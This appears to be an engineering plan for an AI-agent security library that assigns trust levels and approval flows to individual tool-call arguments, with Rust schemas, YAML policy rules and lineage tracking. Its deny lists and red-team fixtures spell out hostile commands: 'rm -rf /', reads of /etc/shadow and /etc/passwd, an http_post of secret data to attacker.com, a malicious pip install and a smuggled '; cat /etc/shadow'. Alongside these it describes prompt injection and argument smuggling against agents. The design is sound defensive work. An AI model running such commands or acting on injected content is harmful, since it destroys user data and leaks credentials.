# Phase 2 — AgentSecurity Argument Provenance MVP

**Priority:** P0  
**Window:** 1-3 weeks  
**Owner:** agent-guard, agent-graph, forge-pilot  

---

## Objective

Implement PACT-style argument-level authority binding for tool invocation. The security boundary is at the argument level, not the tool-call level. Arguments that mutate state, execute shell commands, access network, or manage packages require elevated trust and explicit approval.

---

## Core Problem

Current tool invocation security treats entire tool calls as trusted or untrusted. This is insufficient because:

1. A `terminal` tool call with `echo "hello"` is benign, but `terminal` with `rm -rf /` is dangerous
2. A `write_file` call to `/tmp/test.txt` is low-risk, but to `/etc/passwd` is critical
3. A `read_file` call is read-only, but the path might traverse to sensitive directories
4. Model-generated arguments may contain injection payloads even when the tool itself is allowed

**PACT insight:** Authority must be bound to individual arguments, not whole tool calls.

---

## Semantic Role Classification

Every tool argument must be classified by its **semantic role**:

| Role | Description | Examples | Default Trust Level |
|---|---|---|---|
| `read_only` | Pure observation, no side effects | `read_file(path)`, `search_files(pattern)` | benign |
| `mutation` | Modifies existing state | `patch(path, old, new)`, `write_file(path, content)` | elevated |
| `shell` | Executes arbitrary system commands | `terminal(command)` | dangerous |
| `filesystem` | Creates/deletes files or directories | `write_file`, `delete_file`, `create_dir` | elevated |
| `network` | Makes outbound network requests | `web_search`, `browser_navigate`, `http_get` | elevated |
| `package_management` | Installs/modifies system packages | `apt install`, `pip install`, `cargo add` | dangerous |
| `configuration` | Modifies system or app configuration | `edit_config`, `set_env_var` | elevated |

---

## Trust Level Matrix

| Trust Level | Authority Required | Approval Flow |
|---|---|---|
| `benign` | None | Auto-approved, logged for audit |
| `elevated` | Policy approval or user consent | Check policy rules; if no matching rule, escalate to user |
| `dangerous` | User consent + dry-run first | Require explicit user approval; offer dry-run mode if available |

---

## Argument Contract Schema

```rust
pub struct ArgumentContractV1 {
    pub tool_name: String,
    pub semantic_role: SemanticRole,
    pub arguments: Vec<ArgumentSpecV1>,
    pub overall_decision: ContractDecision,
    pub recorded_time: DateTime<Utc>,
}

pub enum SemanticRole {
    ReadOnly,
    Mutation,
    Shell,
    Filesystem,
    Network,
    PackageManagement,
    Configuration,
}

pub struct ArgumentSpecV1 {
    pub arg_name: String,
    pub arg_value_hash: String,  // blake3 hash of argument value
    pub trust_level: TrustLevel,
    pub authority_required: Option<AuthorityRequirement>,
    pub decision: ArgumentDecision,
    pub denial_reason: Option<String>,
}

pub enum TrustLevel {
    Benign,
    Elevated,
    Dangerous,
}

pub enum AuthorityRequirement {
    UserConsent,
    PolicyApproval,
    DryRunFirst,
}

pub enum ArgumentDecision {
    Approved,
    Denied,
    Escalated,
    DryRunScheduled,
}

pub enum ContractDecision {
    Approved,
    Denied,
    PartiallyApproved { approved_args: Vec<String>, denied_args: Vec<String> },
    Escalated,
}
```

---

## Policy Rules Engine

Policy rules determine whether an argument is auto-approved or requires escalation:

```rust
pub struct PolicyRuleV1 {
    pub rule_id: String,
    pub tool_pattern: String,  // glob pattern matching tool name
    pub arg_name_pattern: Option<String>,  // glob pattern matching argument name
    pub arg_value_pattern: Option<String>,  // regex pattern matching argument value
    pub path_prefix_allowed: Option<Vec<String>>,  // allowed path prefixes for filesystem args
    pub path_prefix_denied: Option<Vec<String>>,  // denied path prefixes
    pub network_host_allowed: Option<Vec<String>>,  // allowed hosts for network args
    pub network_host_denied: Option<Vec<String>>,  // denied hosts
    pub command_pattern_allowed: Option<Vec<String>>,  // allowed shell command patterns
    pub command_pattern_denied: Option<Vec<String>>,  // denied shell command patterns
    pub default_decision: ArgumentDecision,
}
```

### Example Policy Rules

```yaml
rules:
  - rule_id: "allow-read-coding-dir"
    tool_pattern: "read_file"
    path_prefix_allowed:
      - "/home/sikmindz/Coding/"
    default_decision: Approved

  - rule_id: "deny-etc-access"
    tool_pattern: "*"
    path_prefix_denied:
      - "/etc/"
      - "/root/"
      - "/boot/"
    default_decision: Denied

  - rule_id: "allow-safe-terminal"
    tool_pattern: "terminal"
    command_pattern_allowed:
      - "^cargo (check|test|clippy|fmt)"
      - "^npm (run|test|build)"
      - "^git (status|diff|log|show)"
      - "^ls "
      - "^du "
      - "^find . -name"
    default_decision: Approved

  - rule_id: "deny-destructive-terminal"
    tool_pattern: "terminal"
    command_pattern_denied:
      - "^rm -rf"
      - "^sudo"
      - "^dd "
      - "^mkfs"
      - "^chmod 777"
    default_decision: Denied

  - rule_id: "allow-localhost-network"
    tool_pattern: "browser_navigate|web_search|http_*"
    network_host_allowed:
      - "localhost"
      - "127.0.0.1"
      - "*.nousresearch.com"
      - "*.github.com"
      - "*.huggingface.co"
    default_decision: Approved
```

---

## Mixed-Trust Enforcement

The system must handle **mixed-trust tool invocations** where some arguments are benign and others are dangerous:

### Example: write_file with safe path but dangerous content

```
Tool: write_file
Arguments:
  - path: "/tmp/test.txt"  → benign (allowed path)
  - content: "#!/bin/bash\nrm -rf /" → dangerous (contains destructive shell script)

Decision: Escalate to user with warning about content
```

### Example: terminal with allowed command but dangerous path

```
Tool: terminal
Arguments:
  - command: "cat /etc/shadow" → denied (path in denied list)

Decision: Denied with reason "Path /etc/shadow is in denied list"
```

### Example: Partial approval

```
Tool: delegate_task
Arguments:
  - goal: "Fix the bug" → benign
  - toolsets: ["terminal", "file", "browser", "web"] → elevated (terminal + browser)
  - context: "..." → benign

Decision: PartiallyApproved
  - approved_args: ["goal", "context"]
  - denied_args: ["toolsets"] (escalate: request user approve specific toolsets)
```

---

## Dry-Run Mode

For dangerous operations, offer a **dry-run mode** that simulates the operation without executing:

```rust
pub struct DryRunResultV1 {
    pub tool_name: String,
    pub would_have_executed: String,  // human-readable description
    pub side_effects_simulated: Vec<String>,
    pub files_that_would_change: Vec<String>,
    pub network_requests_that_would_fire: Vec<String>,
    pub risk_assessment: RiskAssessment,
}

pub enum RiskAssessment {
    Low,
    Medium,
    High,
    Critical,
}
```

---

## Argument Lineage Tracking

Track the provenance of each argument through transformations:

```rust
pub struct ArgumentLineageV1 {
    pub argument_name: String,
    pub final_value_hash: String,
    pub provenance_chain: Vec<ProvenanceStepV1>,
}

pub struct ProvenanceStepV1 {
    pub step: u32,
    pub origin: ProvenanceOrigin,
    pub value_hash: String,
    pub value_preview: String,  // truncated, max 200 chars
    pub transform_reason: Option<String>,
    pub actor: Option<String>,
}

pub enum ProvenanceOrigin {
    UserInput,
    ModelGenerated,
    PolicyTransformed,
    UserEdited,
    SystemInjected,
}
```

### Example Lineage

```
Argument: terminal.command

Step 0: ModelGenerated
  Value: "cargo test --workspace"
  Actor: "qwen3.5:cloud"

Step 1: PolicyTransformed
  Value: "cargo test --workspace"
  Reason: "Hashed for audit trail"
  Actor: "agent-guard policy engine"

Step 2: UserEdited
  Value: "cargo test --workspace --all-features"
  Actor: "sikmindz"

Final: "cargo test --workspace --all-features"
```

---

## Files to Create

```text
Libraries/agent-guard/src/
  lib.rs
  argument_contracts/
    mod.rs
    contract_types.rs
    contract_validator.rs
    contract_decision.rs
  policy_engine/
    mod.rs
    policy_rules.rs
    policy_loader.rs
    policy_matcher.rs
  trust_classifier/
    mod.rs
    semantic_role_classifier.rs
    trust_level_classifier.rs
    path_analyzer.rs
    command_analyzer.rs
    network_analyzer.rs
  dry_run/
    mod.rs
    terminal_dry_run.rs
    filesystem_dry_run.rs
    network_dry_run.rs
  lineage_tracker/
    mod.rs
    provenance_chain.rs
    lineage_receipt.rs
  receipts/
    mod.rs
    capability_argument_contract_receipt.rs
    argument_lineage_receipt.rs

Libraries/agent-guard/tests/
  mixed_trust_arguments/
    write_file_safe_path_dangerous_content.rs
    terminal_allowed_command_dangerous_path.rs
    partial_approval_scenarios.rs
  policy_rules/
    path_prefix_matching.rs
    command_pattern_matching.rs
    network_host_matching.rs
  dry_run/
    terminal_dry_run_tests.rs
    filesystem_dry_run_tests.rs
  lineage/
    provenance_chain_tests.rs
    user_edit_tracking.rs

Libraries/agent-guard/docs/
  POLICY_RULES_GUIDE.md
  TRUST_CLASSIFICATION.md
  DRY_RUN_SPEC.md
  LINEAGE_TRACKING.md
```

---

## Integration Points

### agent-graph Integration

```rust
// Before executing any tool call, agent-graph must:
// 1. Build argument contract
// 2. Classify trust levels
// 3. Check policy rules
// 4. Emit capability argument contract receipt
// 5. Emit argument lineage receipt (if arguments transformed)
// 6. Execute only if overall_decision allows

let contract = agent_guard.build_contract(&tool_call)?;
let validated = agent_guard.validate(&contract)?;

match validated.overall_decision {
    ContractDecision::Approved => execute_tool(tool_call),
    ContractDecision::Denied => return Err(AccessDenied),
    ContractDecision::PartiallyApproved { .. } => {
        // Request user approval for denied args
        let user_decision = request_user_approval(&validated)?;
        if user_decision.approved {
            execute_tool(tool_call)
        } else {
            return Err(UserDenied);
        }
    }
    ContractDecision::Escalated => {
        // Escalate to human operator
        escalate_to_operator(&validated)?;
        // Wait for operator decision...
    }
}
```

### forge-pilot Integration

forge-pilot must emit argument lineage for all model-generated arguments:

```rust
let lineage = ArgumentLineageV1 {
    argument_name: "command".to_string(),
    final_value_hash: blake3_hex(&final_command),
    provenance_chain: vec![
        ProvenanceStepV1 {
            step: 0,
            origin: ProvenanceOrigin::ModelGenerated,
            value_hash: blake3_hex(&initial_command),
            value_preview: truncate(&initial_command, 200),
            transform_reason: None,
            actor: Some(model_id.clone()),
        },
        // ... additional steps if transformed
    ],
};

agent_guard.record_lineage(lineage)?;
```

---

## Acceptance Gates

1. ✅ All tools in the workspace have semantic role classifications
2. ✅ Policy rules engine loads and matches rules correctly
3. ✅ Mixed-trust scenarios are handled correctly (partial approval, escalation)
4. ✅ Dry-run mode works for terminal, filesystem, and network operations
5. ✅ Argument lineage is tracked for all model-generated arguments
6. ✅ Capability argument contract receipts are emitted for all tool invocations
7. ✅ Argument lineage receipts are emitted when arguments are transformed
8. ✅ Red-team fixtures prove that dangerous arguments are blocked
9. ✅ Benign retrieval-then-act cases route to approval or execution without friction

---

## Red-Team Fixtures

Test the following attack patterns:

1. **Path traversal injection**
   ```
   read_file(path="../../../etc/passwd")
   ```

2. **Shell command injection**
   ```
   terminal(command="echo hello; rm -rf /")
   ```

3. **Prompt injection via file content**
   ```
   write_file(path="/tmp/script.sh", content="#!/bin/bash\nrm -rf /")
   ```

4. **Network exfiltration**
   ```
   http_post(url="https://attacker.com/exfil", body=secret_data)
   ```

5. **Package supply chain attack**
   ```
   terminal(command="pip install malicious-package")
   ```

6. **Symlink attack**
   ```
   write_file(path="/tmp/trusted-file", content="...")  # /tmp/trusted-file is symlink to /etc/passwd
   ```

7. **Argument smuggling via transformation**
   ```
   Model generates: "cargo test"
   Policy transforms to: "cargo test; cat /etc/shadow"  # Should be blocked
   ```

---

## Rollback Plan

- If policy rules are too restrictive, add `policy_bypass_mode` for development (logs warnings but allows operations)
- If argument lineage tracking causes performance issues, make it optional via feature flag
- If dry-run mode is incomplete, fall back to "user consent required" without dry-run
- All receipts are advisory in Phase 2; enforcement becomes mandatory in Phase 3
